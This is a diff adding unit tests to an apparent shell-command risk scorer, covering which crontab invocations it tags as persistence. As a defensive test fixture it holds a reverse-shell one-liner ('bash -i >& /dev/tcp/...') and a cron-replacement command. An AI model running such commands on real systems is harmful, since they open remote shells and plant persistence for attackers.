@@ -87,3 +87,27 @@ def test_top_reason_is_human_readable():
 def test_from_file_falls_back_when_missing():
     r = LexiconRanker.from_file("/nonexistent/lexicon.json")
     assert R.verdict(r.score("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")) == "escalate"
+
+
+def test_crontab_list_is_not_flagged_as_persistence():
+    # crontab -l is read-only (lists the current schedule); it does not add
+    # anything. Found live 2026-07-21: a routine "crontab -l" from an
+    # unrelated tool checking its own schedule was scored as "adding a cron
+    # entry" and escalated into a false-positive incident.
+    res = R.score("crontab -l")
+    assert "persistence" not in res.tags
+
+
+def test_crontab_remove_is_not_flagged_as_persistence():
+    res = R.score("crontab -r")
+    assert "persistence" not in res.tags
+
+
+def test_crontab_edit_is_still_flagged_as_persistence():
+    res = R.score("crontab -e")
+    assert "persistence" in res.tags
+
+
+def test_crontab_replace_from_file_is_still_flagged_as_persistence():
+    res = R.score("crontab /tmp/evil_cron")
+    assert "persistence" in res.tags
